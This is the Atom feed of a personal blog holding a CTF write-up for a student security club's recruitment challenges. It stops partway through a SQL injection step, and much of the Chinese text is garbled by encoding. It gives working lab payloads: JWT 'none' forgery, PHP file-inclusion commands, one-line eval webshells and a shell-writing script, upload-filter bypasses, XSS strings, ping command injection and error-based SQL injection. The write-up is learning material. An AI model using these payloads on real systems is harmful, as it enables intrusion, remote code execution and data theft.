<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Leon&#39;s blogğŸ˜½</title>
  
  <subtitle>å†™äº›éšç¬”</subtitle>
  <link href="https://foreon.github.io/atom.xml" rel="self"/>
  
  <link href="https://foreon.github.io/"/>
  <updated>2023-11-03T16:15:39.789Z</updated>
  <id>https://foreon.github.io/</id>
  
  <author>
    <name>Leon</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>YuLin 2023 Recruit Writeup</title>
    <link href="https://foreon.github.io/posts/36124.html"/>
    <id>https://foreon.github.io/posts/36124.html</id>
    <published>2023-11-03T15:56:39.000Z</published>
    <updated>2023-11-03T16:15:39.789Z</updated>
    
    <content type="html"><![CDATA[<h1 id="YuLin-2023-Recruit-Writeup"><a href="#YuLin-2023-Recruit-Writeup" class="headerlink" title="YuLin 2023 Recruit Writeup"></a>YuLin 2023 Recruit Writeup</h1><h1 id="å‰è¨€ï¼ˆå ä¸ªç”²å…ˆ"><a href="#å‰è¨€ï¼ˆå ä¸ªç”²å…ˆ" class="headerlink" title="å‰è¨€ï¼ˆå ä¸ªç”²å…ˆ"></a>å‰è¨€ï¼ˆå ä¸ªç”²å…ˆ</h1><h3 id="part1æ˜¯ç”¨wordå†™çš„ï¼Œç›´æ¥é»è´´è¿‡æ¥é‡å¤ªå¤šå°±ä¸ä¿®æ”¹äº†ğŸ˜­ï¼Œpart2-æ˜¯ç”¨mdï¼Œå¯èƒ½çœ‹èµ·æ¥èˆ’æœä¸€ç‚¹ã€‚å¦‚æœè¯»è€…çœ‹å¾—æ¯”è¾ƒéš¾å—ï¼Œè¿™éå¸¸æ­£å¸¸ï¼Œè¯·åŸè°…æˆ‘çš„æ‡’æƒ°ğŸ™‡"><a href="#part1æ˜¯ç”¨wordå†™çš„ï¼Œç›´æ¥é»è´´è¿‡æ¥é‡å¤ªå¤šå°±ä¸ä¿®æ”¹äº†ğŸ˜­ï¼Œpart2-æ˜¯ç”¨mdï¼Œå¯èƒ½çœ‹èµ·æ¥èˆ’æœä¸€ç‚¹ã€‚å¦‚æœè¯»è€…çœ‹å¾—æ¯”è¾ƒéš¾å—ï¼Œè¿™éå¸¸æ­£å¸¸ï¼Œè¯·åŸè°…æˆ‘çš„æ‡’æƒ°ğŸ™‡" class="headerlink" title="part1æ˜¯ç”¨wordå†™çš„ï¼Œç›´æ¥é»è´´è¿‡æ¥é‡å¤ªå¤šå°±ä¸ä¿®æ”¹äº†ğŸ˜­ï¼Œpart2  æ˜¯ç”¨mdï¼Œå¯èƒ½çœ‹èµ·æ¥èˆ’æœä¸€ç‚¹ã€‚å¦‚æœè¯»è€…çœ‹å¾—æ¯”è¾ƒéš¾å—ï¼Œè¿™éå¸¸æ­£å¸¸ï¼Œè¯·åŸè°…æˆ‘çš„æ‡’æƒ°ğŸ™‡"></a>part1æ˜¯ç”¨wordå†™çš„ï¼Œç›´æ¥é»è´´è¿‡æ¥é‡å¤ªå¤šå°±ä¸ä¿®æ”¹äº†ğŸ˜­ï¼Œpart2  æ˜¯ç”¨mdï¼Œå¯èƒ½çœ‹èµ·æ¥èˆ’æœä¸€ç‚¹ã€‚å¦‚æœè¯»è€…çœ‹å¾—æ¯”è¾ƒéš¾å—ï¼Œè¿™éå¸¸æ­£å¸¸ï¼Œè¯·åŸè°…æˆ‘çš„æ‡’æƒ°ğŸ™‡</h3><h1 id="part1"><a href="#part1" class="headerlink" title="part1:"></a>part1:</h1><h1 id="Tutorial"><a href="#Tutorial" class="headerlink" title="Tutorial"></a>Tutorial</h1><h1 id="1-http"><a href="#1-http" class="headerlink" title="1.http"></a>1.http</h1><p>è¿™é‡Œè¦æ³¨æ„ï¼Œadminæ˜¯æ”¹cookieé‡Œçš„admin&#x3D;1!</p><p>2.302è·³è½¬</p><p>æŸ¥çœ‹æºä»£ç æ‰¾åˆ°&#x2F;302.php</p><p>Curl -i æ‰¾åˆ°flag</p><p>3.encode</p><p>å…³äºdecodeå¯ä»¥çœ‹çœ‹è¿™ä¸ªé“¾æ¥</p><p><a href="https://www.cnblogs.com/ruoli-s/p/14206145.html">https://www.cnblogs.com/ruoli-s/p/14206145.html</a></p><p>åˆ¤æ–­ç¬¬ä¸€ä¸ªæ˜¯md5</p><p>è§£å¯†å¾—åˆ°Yulin</p><p>åˆ¤æ–­ç¬¬äºŒä¸ªæ˜¯hexç¼–ç </p><p>è§£ç å¾—åˆ°Sec{we_mu5t_kn0w</p><p>ç¬¬ä¸‰ä¸ªæ˜¯base64</p><p>è§£ç å¾—åˆ°_c0mm0n</p><p>åˆ¤æ–­ç¬¬å››ä¸ªæ˜¯htmlå®ä½“ç¼–ç </p><p>è§£ç å¾—åˆ°_enc0d1ngs}</p><p>ç»„åˆä¸€ä¸‹å¾—åˆ°flag</p><p>YulinSec{we_mu5t_kn0w_c0mm0n _enc0d1ngs}</p><p>4.Method</p><p>è¢«æç¤ºæœ‰å¾ˆå¤šhttp<br>method</p><p>æ‹¿postmanä¸€ä¸ªä¸ªè¯•å°±è¯•å‡ºæ¥äº†</p><p>5.cal-1</p><p>æºä»£ç è¿›å»æ”¹ä¸‹é•¿åº¦å°±å®Œäº‹</p><p>6.cal-2</p><p>å‘ç°è¦ç”¨postçš„æ–¹æ³•ä¼ æ•°æ®ï¼Œå°±å®Œäº‹äº†</p><p>7.cal-3</p><p>ç”¨pythonè„šæœ¬åš</p><p>æˆ‘è¿˜å­¦äº†å¥½ä¸€ä¼šï¼Œæ„Ÿè§‰pythonè„šæœ¬æ˜¯ä¸ªå¤§é—®é¢˜</p><p>import requests<br>s&#x3D;requests.Session()<br>url&#x3D;â€™<a href="http://43.142.109.233:44504/index.php">http://43.142.109.233:44504/index.php</a>â€˜<br>r&#x3D;s.get(url)  </p><p>res&#x3D;r.text  </p><p>a&#x3D;res.find(â€œ<p>â€œ)<br>b&#x3D;res.find(â€œ&#x2F;p&gt;â€,a)<br>#æ‰¾åˆ°æˆ‘ä»¬è¦è®¡ç®—çš„å¼å­çš„å‰åä½ç½®<br>num&#x3D;res[a+3:b-1]<br>print(a)<br>print(b)<br>print(num)<br>r&#x3D;s.post(url,data&#x3D;{â€˜resultâ€™:eval(num)})<br>print(r.content)</p><p>8.https</p><p>å‰è¨€:</p><p>ç»å¤§ä½¬æé†’,äº†è§£äº†ä¸å°‘jwtçŸ¥è¯†</p><p>äº†è§£åˆ°ä¸¤ç§ä¸»è¦æ€è·¯</p><p>1.å¼±å£ä»¤æŠŠkeyçˆ†å‡ºæ¥</p><p>2.ä½¿ç”¨noneçš„æ–¹å¼</p><p>ç”±äºå®‰è£…ä¸æ¸…æ¥šç¬¬ä¸€æ¬¡æ‰€éœ€çš„å·¥å…·ğŸ˜…ï¼Œæ‰€ä»¥é‡‡ç”¨ç¬¬äºŒç§æ–¹æ³•</p><p>åŸç†å¦‚ä¸‹æ‰€ç¤º</p><p>æœ¬é¢˜æŠ“åŒ…å‘ç°token,äºæ˜¯é‡‡ç”¨jwtç»•è¿‡</p><p>1.å°†å¤´éƒ¨ä¿¡æ¯çš„algå€¼æ”¹ä¸ºnoneï¼Œå¹¶è¿›è¡Œbase64åŠ å¯†</p><p>2.å°†å£°æ˜éƒ¨åˆ†çš„adminå€¼æ”¹ä¸ºtrueï¼Œä¹Ÿè¿›è¡Œbase64åŠ å¯†</p><p>3.æ–°ç»„åˆçš„JWTåº”è¯¥ä¸º<code>å¤´éƒ¨``.``å£°æ˜``.</code>(å› ä¸ºå¤´éƒ¨ä¸­çš„åŠ å¯†æ–¹å¼ä¸ºnoneï¼Œæ‰€ä»¥ç­¾åéƒ¨åˆ†å¯ä»¥èˆå»)ï¼Œä½†åˆç”±äº&#x3D;å·ä¼šä¸urlè§£ç äº§ç”Ÿæ­§ä¹‰ï¼Œæ‰€ä»¥éœ€è¦å°†&#x3D;å·åˆ é™¤ï¼Œè€ŒBase64URLæ˜¯æ”¯æŒè¿™ç§å†™æ³•çš„</p><p>æœ€ç»ˆçš„JWTå€¼ä¸ºewogICJhbGciOiAibm9uZSIsCiAgInR5cCI6ICJKV1QiCn0.ewogICJhZG1pbiI6ICIxIiwKICAiaWF0IjogMTY5NDk0OTM0NSwKICAiZXhwIjogMTY5NDk1NjU0NSwKICAianRpIjogIjM0YTczNGEzODAzZGY1NmZlYmIzOTg3MzJlOWQwZDE5Igp9.</p><p>4.æŠŠtokenæ”¾åˆ°cookieé‡Œå¾—åˆ°flag</p><p>LFI</p><ol><li></li></ol><p>ä¾ç…§æç¤ºä¼ å‚å³å¯</p><ol start="2"><li></li></ol><p>ä¸çŸ¥é“ä¸ºå•¥hackbarçš„postè¿™ç±»é¢˜ç”¨ä¸äº†ï¼Ÿ</p><p>é‚£å°±ç”¨postmanæ¥post</p><p>ä½¿ç”¨file&#x3D;php:&#x2F;&#x2F;input + post <?phpsystem("ls");?></p><p>å†file&#x3D;php:&#x2F;&#x2F;input + post <?php system("catflag_195780473.txt");?></p><p>å¾—åˆ°flag</p><ol start="3"><li></li></ol><h5 id="ä½¿ç”¨data-text-plain-base64-xxxx-base64ç¼–ç åçš„æ•°æ®"><a href="#ä½¿ç”¨data-text-plain-base64-xxxx-base64ç¼–ç åçš„æ•°æ®" class="headerlink" title="ä½¿ç”¨data:&#x2F;&#x2F;text&#x2F;plain;base64,xxxx(base64ç¼–ç åçš„æ•°æ®)"></a>ä½¿ç”¨data:&#x2F;&#x2F;text&#x2F;plain;base64,xxxx(base64ç¼–ç åçš„æ•°æ®)</h5><p>data:&#x2F;&#x2F;text&#x2F;plain,<?phpsystem("ls")?></p><p>data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgc3lzdGVtKCJscyIpPz4&#x3D;</p><p>data:&#x2F;&#x2F;text&#x2F;plain,<?phpsystem("cat flag_8491675293")?></p><p>data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgc3lzdGVtKCJscyIpPz4&#x3D;</p><p>å¾—åˆ°flag</p><ol start="4"><li></li></ol><p>çœ‹åˆ°æç¤ºï¼Œç›´æ¥æƒ³åˆ°ç”¨base64ç¼–ç è½¬å‡º</p><p>file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</p><p>å¾—åˆ°ä¸€ä¸²base64ç¼–ç ï¼Œè½¬ç ä¹‹åå³å¾—åˆ°flag</p><ol start="5"><li></li></ol><p>çœ‹æ•™ç¨‹ç»•è¿‡file_get_contents($file) äº†ä½†æ˜¯è¿˜å¯¹åŸç†ä¸€çŸ¥åŠè§£</p><p>é‡‡ç”¨ç¬¬ä¸€ç§æ–¹å¼å°±æ‹¿åˆ°flagäº†</p><ol start="6"><li></li></ol><p>æ–‡æ¡£é‡Œè¯´çš„å¾ˆæ¸…æ¥šäº†ï¼Œè¯è¯´æˆ‘è‡ªå·±è¯•çš„ä¸€å¥è¯æœ¨é©¬<?php@eval($_POST["value"]);?>å°±ä¸å¤ªå¥½ä½¿ï¼Œè¿˜å¾—æ˜¯å›¾ç‰‡é‡Œçš„è¿™ä¸ªå¥½ä½¿ï¼Œç„¶åå°±ç”Ÿæˆä¸€å¥è¯æœ¨é©¬å›¾ç‰‡å‘—ï¼Œç„¶åèšå‰‘</p><p><code>&lt;?php</code><br><code>fputs(fopen(â€œshell.phpâ€,&#39;w&#39;),&#39;&lt;?php @eval($_POST[â€leonâ€œ])ï¼›?&gt;</code></p><p><code>&#39;</code><br><code>); ?&gt;</code></p><p>è¦æ³¨æ„çš„æ˜¯èšå‰‘è®¿é—®çš„ç›®å½•æ˜¯ç”Ÿæˆçš„shell.php</p><p>å³ä¸º<a href="http://43.142.109.233:21005/shell.php">http://43.142.109.233:21005/shell.php</a></p><ol start="7"><li></li></ol><p>è¿™é¢˜èŠ±äº†æˆ‘å¤§æ¦‚ä¸€å¤©çš„æ—¶é—´é’»ç ”ï¼Œæœ€ç»ˆåšå‡ºæ¥äº†</p><p>å‚è€ƒï¼š<a href="https://blog.csdn.net/qq_45521281/article/details/106665608">LFI ç»•è¿‡ Session åŒ…å«é™åˆ¶ Getshell_é€šè¿‡sessidè¿›è¡Œæ–‡ä»¶å†™å³å¯,ä½¿ç”¨ file:&#x2F;&#x2F;localhost&#x2F; è¿›è¡Œç»•è¿‡_zhangä¸‰çš„åšå®¢-CSDNåšå®¢</a></p><p>å…ˆäº†è§£sessionçŸ¥è¯†å§</p><p>Phpinfoå…ˆæ‰¾åˆ°sessionçš„å‚¨å­˜è·¯å¾„</p><p>Sessionè‡ªå®šä¹‰ä¸€ä¸ª</p><p>ç„¶åä¼ ä¸€ä¸ªä¸€å¥è¯æœ¨é©¬</p><p>å‘ç°å¯ä»¥æ§åˆ¶äº†</p><p>äºæ˜¯æœæ–­èšå‰‘è§£å‡º</p><p>è¡¥ä¸€ä¸ªå¤§ä½¬çš„åšæ³•ï¼š</p><p>æ€è·¯æ›´æ¸…æ™°ä¸€äº›</p><p>XSS</p><p>çœ‹çœ‹è¿™è¿™ç¯‡æ”»ç•¥<a href="https://blog.csdn.net/qq_42357070/article/details/83818283">XSSæŒ‘æˆ˜èµ›è§£é¢˜æ€è·¯_å¤šå´å·¡ç¤¼çš„åšå®¢-CSDNåšå®¢</a></p><ol><li></li></ol><p>çœ‹æºä»£ç å‘ç°æœ‰ä¸ªhiddençš„ name</p><p>æ™®æ™®é€šé€šæ„é€ ä¸ªplayloadå°±å®Œäº‹äº†</p><p><code>name=&lt;script&gt;alert(1)&lt;/script&gt;</code></p><ol start="2"><li></li></ol><p>è¿™é‡Œæˆ‘æœ¬æ¥æƒ³ç”¨é—­åˆæ ‡ç­¾æ¥å®Œæˆ</p><p>ä½†æ˜¯å‘ç°&lt;è¢«è½¬ä¹‰äº†ï¼Œåªèƒ½åˆ©ç”¨Â  <code>&#39;onmouseover=alert(1)//</code>ï¼Œä¸è¿‡è¿™é‡Œéœ€è¦ç”¨å•å¼•å·é—­åˆï¼Œæ„é€ playload</p><ol start="3"><li></li></ol><p>å’Œä¸Šé¢˜ä¸€æ ·ï¼Œåªä¸è¿‡æŠŠå•å¼•å·æ¢æˆåŒå¼•å·æ¥é—­åˆç½¢äº†</p><ol start="4"><li></li></ol><p>ç¬¬å››é¢˜å‘ç°ä¼šæŠŠonè½¬æˆo_n</p><p>è€Œä¸”ä¼šç»™<script><br>Â </script>ä¸­é—´çš„ä¸œè¥¿åŠ åŒå¼•å·</p><p>äºæ˜¯ä¸Šç½‘æŸ¥æ”»ç•¥,çŸ¥é“è¦ç”¨ä¼ªåè®®</p><p><code>&quot;&gt;&lt;iframe src=javascript:alert(1)&gt;</code></p><p><code>&quot;&gt;&lt;a href=javascript:alert(1)&gt;</code></p><p><code>&quot;&gt;</code><br><code>&lt;a href=&quot;javascript:alert(1)&quot;&gt;zhouzhong&lt;/a&gt;</code></p><p><code>&quot;&gt;&lt;a href=&quot;javascript:%61lert(1)&quot;&gt;zhouzhong&lt;/a&gt; //</code></p><p><code>å°±åšå‡ºæ¥äº†</code></p><p><code>5.</code></p><h2 id="è¯•äº†è¯•â€"><a href="#è¯•äº†è¯•â€" class="headerlink" title="è¯•äº†è¯•â€&gt;"></a>è¯•äº†è¯•â€&gt;</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="number">1</span>)&lt;<span class="regexp">/script&gt; /</span>/</span><br></pre></td></tr></table></figure><p>å¯èƒ½æ˜¯å±è”½äº†script,äºæ˜¯æ€è·¯æ˜¯åŒå†™ç»•è¿‡</p><h2 id="alert-0"><a href="#alert-0" class="headerlink" title="&quot;&gt;&lt;scriscriptpt&gt;alert(0)&lt;/scriscriptpt&gt;//"></a><code>&quot;&gt;&lt;scriscriptpt&gt;alert(0)&lt;/scriscriptpt&gt;//</code></h2><p>è¿™äº›åŒå†™ä¹Ÿå¯ä»¥</p><p>å°±æ‹¿åˆ°flagäº†</p><ol start="6"><li></li></ol><p>ç”¨ä¼ªåè®®å‘ç°è¿‡æ»¤äº†javascriptï¼Œäºæ˜¯æŸ¥æ”»ç•¥å§</p><p><code>javascrip&amp;#x74;:alert(1)</code></p><p><code>javasc&amp;#x72;ipt:alert1</code></p><p><code>javasc&amp;#x0072;ipt:alert1</code></p><ol start="7"><li></li></ol><p>ç¬¬ä¸€æ¬¡è§è¿™ç§ï¼ŒçŒœæµ‹t_sorté‚£é‡Œæ˜¯éšè—çš„æœç´¢æ¡†</p><p>äºæ˜¯çœ‹æ”»ç•¥å§</p><p>è¿™é‡Œåªè¦æ„é€ å¦‚ä¸‹playloadå°±è¡Œ</p><p><code>t_sort=â€type=â€™â€™textâ€</code><br><code>onclick = â€alert(1)</code></p><p>å¤ç°äº†ä¸€ä¸‹å‘ç°è¿™ä¸ªåŒå¼•å·â€ä¸èƒ½ç”¨</p><p>å¾—ç”¨ä¸‹é¢çš„åŒå¼•å·</p><p>â€œ</p><p>æœªè§£ä¹‹è°œï¼Œå…ˆæ”¾è¿™å§</p><p><code>t_sort=&quot;type=&quot;text&quot;</code><br><code>onclick = &quot;alert(1)</code></p><p>XSSçœ‹æ”»ç•¥æ„‰å¿«çš„akäº†</p><p>è¯è¯´çœŸçš„ä¸æ˜¯æŒ‰è¿™ä¸ªæ”»ç•¥å‡ºé¢˜çš„å—(</p><p>RCE</p><ol><li></li></ol><p>åœ¨å½“å‰ç›®å½•ä¸‹æ²¡æ‰¾ï¼Œäºæ˜¯ ls &#x2F;</p><p>ping<br>127.0.0.1;ls &#x2F; #</p><p>æ‰¾åˆ°flag</p><p>ping<br>127.0.0.1;cat &#x2F;flag_3124131231 #</p><ol start="2"><li></li></ol><p>ping<br>127.0.0.1;ls #</p><p>æœ‰waf</p><p>è¯•äº†ä¸€ä¸‹è¿‡æ»¤äº†;|&amp;â€™&#96;ç­‰ç­‰</p><p>äºæ˜¯ç”¨<code>%0a``ç»•è¿‡</code></p><p><code>ip=127.0.0.1%0als /</code></p><p>å†ip&#x3D;127.0.0.1%0acat<br>&#x2F;flag_31241421414</p><p>å¾—åˆ°flag</p><ol start="3"><li></li></ol><p>è¯•äº†ä¸€ä¸‹è¿‡æ»¤äº†ls</p><p>æ–‡ä»¶ä¸Šä¼ </p><ol><li></li></ol><p>é‡‡ç”¨äº†ä¸€ç§æ–°çš„æ–¹å¼</p><p>ä¼ ä¸€å¥è¯æœ¨é©¬æ–‡ä»¶èšå‰‘åé—¨æŠ¥é”™æ</p><p>äºæ˜¯ç«ç‹ç¦æ­¢jsï¼Œä¼ ä¸€ä¸ª.phpæ–‡ä»¶ä¸Šå»</p><p>è·¯å¾„æ˜¯å¤åˆ¶çš„å›¾åƒé“¾æ¥</p><p>ç„¶åèšå‰‘åé—¨</p><ol start="2"><li></li></ol><p>è€ƒå¯Ÿ.htaccessæ–‡ä»¶</p><p>ç”¨è®°äº‹æœ¬å†™è¿™æ ·ä¸€ä¸ªåä¸º.htaccessçš„æ–‡ä»¶</p><p>æ³¨æ„ä¿å­˜ä¸ºæ‰€æœ‰ç±»å‹</p><p>&lt;FilesMatch<br>â€œ.pngâ€&gt;</p><p>Â  SetHandler application&#x2F;x-httpd-php</p></FilesMatch><p>è¯¥æ–‡ä»¶çš„æ„æ€æ˜¯ï¼Œåªè¦é‡åˆ°æ–‡ä»¶åä¸­åŒ…å«æœ‰â€.pngâ€å­—ç¬¦</p><p>ä¸²çš„ï¼Œç»Ÿä¸€æŒ‰ç…§ php æ–‡ä»¶æ¥æ‰§è¡Œã€‚ç„¶åå°±å¯ä»¥ä¸Šä¼ ä¸€ä¸ªå¸¦ä¸€å¥è¯æœ¨é©¬çš„æ–‡ä»¶ï¼Œä¾‹å¦‚a_php.gifï¼Œä¼š</p><p>è¢«å½“æˆphpæ‰§è¡Œã€‚è¯¥æ–¹æ³•å…¶å®ä¸æ˜¯æ¼æ´ï¼Œæ˜¯Apacheçš„ç‰¹æ€§ã€‚è¯¥æ–¹æ³•å¸¸ç”¨äºé»‘å®¢å…¥ä¾µç½‘ç«™ä¹‹åï¼Œä¸æƒ³</p><p>è¢«å‘ç°ï¼Œç•™ä¸€ä¸ªéšè”½çš„åé—¨ã€‚</p><p>ç„¶åå…ˆä¸Šä¼ .htaccessæ–‡ä»¶,å†ä¸Šæ¬¡æœ¨é©¬.png</p><p>ç„¶åèšå‰‘å°±å®Œäº‹äº†</p><ol start="3"><li></li></ol><p>ä¸Šä¼ phpæ–‡ä»¶æŠ“åŒ…ï¼Œä¿®æ”¹æ–‡ä»¶ç±»å‹ä¸ºimage&#x2F;png</p><p>ç„¶åå°±å¯ä»¥ä¸Šä¼ äº†ï¼Œäºæ˜¯æ„‰å¿«çš„èšå‰‘</p><ol start="4"><li></li></ol><p>è€ƒå¯Ÿæ–‡ä»¶å¤´ç»•è¿‡</p><p>ç”¨winhex</p><p>ä½†æ˜¯è¿™æ ·ä¿®æ”¹åç”¨èšå‰‘è¿æ¥</p><p><a href="http://43.142.109.233:30004/upload/muma.png">http://43.142.109.233:30004/upload/muma.png</a></p><p>è¿˜æ˜¯æŠ¥é”™ï¼Œäºæ˜¯å†æ¬¡é‡‡ç”¨ä¸Šä¼ phpç”¨burpæ”¹pngçš„æ–¹æ³•</p><p>å…¶å®ä¹Ÿå¯ä»¥æ¢ä¸€ç§ç”Ÿæˆshell.phpçš„pngå›¾ç‰‡æœ¨é©¬</p><p>ä¸‹æ¬¡å†è¯•</p><p>ç„¶åèšå‰‘å§</p><ol start="5"><li></li></ol><p>å¾ˆæ˜æ˜¾è¦ç»•è¿‡é»‘åå•è¿™äº›</p><p>ä½†æ˜¯æ˜æ˜¾é»‘åå•å¤ªå°‘äº†ï¼Œè¿™é‡Œå…ˆç”¨å¤§å†™ç»•è¿‡ç½¢</p><p>ç„¶è€Œå¤§å†™ç»•è¿‡å¹¶ä¸å¯è¡Œï¼Ÿ</p><p>å†æ¬¡å°è¯•åŒå†™ç»•è¿‡ï¼Œæˆäº†ï¼Œäºæ˜¯èšå‰‘</p><ol start="6"><li></li></ol><p>å†æ¬¡å°è¯•åŒå†™</p><p>å‘ç°ä¸è¡Œï¼Œæ·»åŠ äº†ä¸€ä¸ªç©ºæ ¼</p><p>è¿™æ¬¡å¤§å†™ç»•è¿‡åˆè¡Œäº†ï¼Ÿ</p><p>é‚£å°±èšå‰‘å§</p><ol start="7"><li></li></ol><p>æç¤º%00æˆªæ–­</p><p>åŸç†å¦‚ä¸‹</p><p>ç…§çŒ«ç”»è™å°±å‡ºæ¥äº†</p><ol start="8"><li></li></ol><p>è€ƒå¯Ÿ16è¿›åˆ¶00æˆªæ–­</p><p>Burpä¸Šä¼ å›¾ç‰‡æœ¨é©¬æŠ“åŒ…</p><p>åœ¨è·¯å¾„åé¢åŠ ä¸€ä¸ª1.php+,å†åœ¨hexé‡Œæ‰¾åˆ°+å¯¹åº”çš„ç¼–ç ï¼Œå¹¶æ”¹æˆ00,å°±è·Ÿä¸Šé¢˜ä¸€æ ·äº†</p><ol start="9"><li></li></ol><p>æç¤ºç™½åå•ï¼Œä½†æ˜¯è¯•ä¸€ä¸‹åˆè§‰å¾—æ˜¯é»‘åå•ï¼Ÿ</p><p>åŒå†™å¤§å†™ç»•è¿‡éƒ½æ²¡ç”¨ï¼Œé‚£è¯•è¯•åˆ«çš„å§</p><p>è«åå¥‡å¦™åšå‡ºæ¥äº†ï¼Ÿ</p><p>æ”¹æˆè¿™æ ·</p><p>æ³¨æ„èšå‰‘è¿æ¥phtmlè¿˜æ˜¯å°å¿ƒ(ä¸ºä»€ä¹ˆ</p><p>è¿™é¢˜è¦å†åšä¸€é</p><p>ä¸ºä»€ä¹ˆè¿™é‡Œå¤šäº†ä¸ªç©ºæ ¼ï¼Œæ€ä¹ˆå¤ç°ï¼Ÿ</p><p>å†åšäº†ä¸€æ¬¡ä¸ºä»€ä¹ˆåˆæ²¡ç©ºæ ¼äº†ï¼Œè€Œä¸”è¿™é‡Œè·¯å¾„ä¸ºä»€ä¹ˆä¸éœ€è¦å¤§å†™ï¼Ÿ</p><p>11.äºŒæ¬¡æ¸²æŸ“</p><p>åˆæˆä¸€ä¸ªgifæœ¨é©¬æ–‡ä»¶ï¼Œæ³¨æ„æ–‡ä»¶å¤´è¦å¯¹</p><p>è¿˜æ˜¯ä¸è¡Œï¼Ÿé‚£è¿˜æ˜¯æ‰¾ä¸€å¼ çœŸæ­£çš„gifåˆæˆå§</p><p>ç°åœ¨è¡Œäº†</p><p>ä¸‹è½½gifï¼Œæ¯”å¯¹æ²¡æœ‰æ”¹å˜çš„åœ°æ–¹</p><p>ç„¶ååœ¨ä¸æ”¹å˜çš„åœ°æ–¹æ’å…¥ä¸€å¥è¯æœ¨é©¬</p><p>èšå‰‘è¿å›¾ç‰‡é“¾æ¥è€æŠ¥é”™</p><p>å»å­¦äº†ä¸€ä¸‹</p><p>å…¶å®ç”¨ä¸€ä¸ªæ–‡ä»¶åŒ…å«æ¼æ´å°±èƒ½ç”¨èšå‰‘è¿æ¥</p><p>è¦åˆ©ç”¨include.php?file&#x3D;upload&#x2F;</p><p>ç„¶åå°±å¯ä»¥ç”¨èšå‰‘è¿æ¥äº†</p><p>ç½‘é¡µä¹Ÿæ˜¯å¯ä»¥è®¿é—®çš„</p><ol start="12"><li></li></ol><p>æç¤ºæ˜¯åˆ©ç”¨move_uploaded_file($temp_file,<br>$img_path)çš„æ¼æ´ï¼Œè¿™ä¸ªå‡½æ•°å®ƒæœ‰ä¸€ä¸ªç‰¹æ€§ï¼Œä¼šå¿½ç•¥åˆ°æ–‡ä»¶æœ«å°¾çš„&#x2F;.</p><p>è¿™æ ·ä¸Šä¼ ï¼Œç„¶åburpæŠ“åŒ…</p><p>æŠŠåå­—æ”¹æˆmuma.php&#x2F;.</p><p>èšå‰‘è¿æ¥ &#x2F;upload&#x2F;muma.phpå‘ç°å¯ä»¥è®¿é—®äº†</p><ol start="13"><li></li></ol><p>é¡ºè—¤æ‘¸ç“œæ‰¾åˆ°äº†åŸå¸–ï¼ˆæœç´¢èƒ½åŠ›ä¹Ÿæ˜¯èƒ½åŠ›ï¼</p><p>ç›´æ¥çœ‹åŸå¸–å§ï¼Œå“¥ä»¬ä»£ç å®¡è®¡è¿˜çœ‹ä¸æ˜ç™½</p><p>Sqlæ³¨å…¥</p><p>1.æ™®é€šæ³¨å…¥</p><p>æ™®æ™®é€šé€šçš„æ•´å½¢é—­åˆ</p><p>å¦‚å›¾æ‰€ç¤ºåšå®Œ</p><ol start="2"><li></li></ol><p>æç¤ºæ˜¯æŠ¥é”™æ³¨å…¥</p><p>è¯•äº†ä¸€ä¸‹æ˜¯æ•´å½¢é—­åˆæ</p><p>ä»¥ä¸‹é»è´´ä¹‹åçš„ä»£ç æœ‰é—®é¢˜</p><p>çˆ†æ•°æ®åº“</p><p><a href="http://43.142.109.233:20002/?id=-1">http://43.142.109.233:20002/?id=-1</a>Â  and updatexml(1,concat(â€˜~â€™,</p><p>Â Â Â  substr(</p><p>Â Â Â Â Â Â  (select group_concat(schema_name)</p><p>Â Â Â Â Â Â  from information_schema.schemata)</p><p>Â Â Â  , 1 , 31)</p><p>),3)<br>â€“ a</p><p>çˆ†è¡¨å</p><p><a href="http://43.142.109.233:20002/?id=-1">http://43.142.109.233:20002/?id=-1</a>Â  and updatexml(1,concat(â€˜~â€™,</p><p>Â Â Â  substr(</p><p>Â Â Â Â Â Â  (select group_concat(table_name)</p><p>Â Â Â Â Â Â  from information_schema.tables where<br>table_schema&#x3D;database())</p><p>Â Â Â  , 8 , 31)</p><p>),3)<br>â€“ a</p><p>æ³¨æ„è¿™é‡Œè¦å–åé¢çš„å­—ç¬¦æ‰å®Œæ•´</p><p>çˆ†åˆ—å</p><p><a href="http://43.142.109.233:20002/?id=-1">http://43.142.109.233:20002/?id=-1</a>Â  and updatexml(1,concat(â€˜~â€™,</p><p>Â Â Â  substr(</p><p>Â Â Â Â Â Â  (select group_concat(column_name)</p><p>Â Â Â Â Â Â  from information_schema.columns where<br>table_name&#x3D;â€™flagâ€™)</p><p>Â Â Â  , 1 , 31)</p><p>),3)<br>â€“ a</p><p>çˆ†flag</p><p><a href="http://43.142.109.233:20002/?id=-1">http://43.142.109.233:20002/?id=-1</a>Â  and updatexml(1,concat(â€˜~â€™,</p><p>Â Â Â  substr(</p><p>Â Â Â Â Â Â  (select group_concat(flag)</p><p>Â Â Â Â Â Â  from flag)</p><p>Â Â Â  , 10 , 31)</p><p>),3)<br>â€“ a</p><p>æ³¨æ„flagå¤ªé•¿æ˜¾ç¤ºä¸å®Œå…¨ï¼Œåˆ†æ®µæ¥çœ‹å§</p><ol start="3"><li></li></ol><p>å¸ƒå°”ç›²æ³¨</p><p>ä¸€äº›åŸºç¡€çŸ¥è¯†</p><p>æ“ä½œ</p><p>å¼€æ</p><p>è¯•äº†ä¸€ä¸‹å‘ç°æ˜¯æ•´å½¢å½¢é—­åˆ</p><p><a href="http://43.142.109.233:20003/?id=1">http://43.142.109.233:20003/?id=1</a><br>and length(database())&#x3D;8</p><p>å°è¯•åˆ°8å‘ç°å›æ˜¾ok,è¯´æ˜æ•°æ®åº“åä¸º8</p><p>ä¸€ä¸ªä¸ªæŠŠæ•°æ®åè¯•å‡ºæ¥</p><p>æ¨èäºŒåˆ†æŸ¥æ‰¾æ³•</p><p><a href="http://43.142.109.233:20003/?id=1">http://43.142.109.233:20003/?id=1</a><br>and ASCII(SUBSTR(database(),2,1)) &#x3D; 